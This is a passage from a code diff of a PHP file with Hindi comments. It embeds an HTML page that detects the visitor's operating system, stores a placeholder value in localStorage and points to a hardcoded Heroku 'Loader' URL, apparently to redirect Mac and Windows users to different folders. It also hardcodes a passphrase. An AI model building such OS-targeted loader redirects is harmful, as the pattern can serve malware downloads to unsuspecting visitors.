@@ -11,32 +11,36 @@ header('Content-Type: application/json');
 
 $PASSPHRASE = "MySecretKey@123";
 
-// 📄 यह HTML OS detect करेगा और Mac/Windows folder पर redirect करेगा
+// 🔁 यह HTML OS डिटेक्शन स्क्रिप्ट है – इसमें {{ALPHA}} और {{ANIPH}} प्लेसहोल्डर हैं
 $HTML_CONTENT = <<<'HTML'
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Redirecting…</title>
     <script>
+        // ये वैल्यू Loader द्वारा Replace की जाएँगी
         var ALPHA = '{{ALPHA}}';
         var ANIPH = '{{ANIPH}}';
 
+        // 🧠 OS डिटेक्शन – अब Macintosh भी चेक करेगा
         function myOperatingSystem() {
-            const ua = navigator.userAgent;
+            var ua = navigator.userAgent;
+            console.log("🔍 UserAgent:", ua);
             if (ua.indexOf("Win") !== -1) return "Windows";
-            if (ua.indexOf("Mac") !== -1) return "MacOS";
+            if (ua.indexOf("Mac") !== -1 || ua.indexOf("Macintosh") !== -1) return "MacOS";
             if (ua.indexOf("Linux") !== -1) return "Linux";
             if (ua.indexOf("Android") !== -1) return "Android";
-            if (ua.indexOf("iOS") !== -1) return "iOS";
+            if (ua.indexOf("iOS") !== -1 || ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
             return "Unknown";
         }
 
         var os = myOperatingSystem();
+        console.log("🖥️ Detected OS:", os);
         localStorage.setItem('alpha', ALPHA);
 
-        // 🔁 यह URL Loader के domain पर point करेगा
+        // 🔗 अपने Loader का EXACT URL (बिना slash के) – यहाँ Hardcode करें
         var BASE_URL = 'https://loaderfortest-23d1cffa4338.herokuapp.com';
 
         if (os === 'MacOS') {
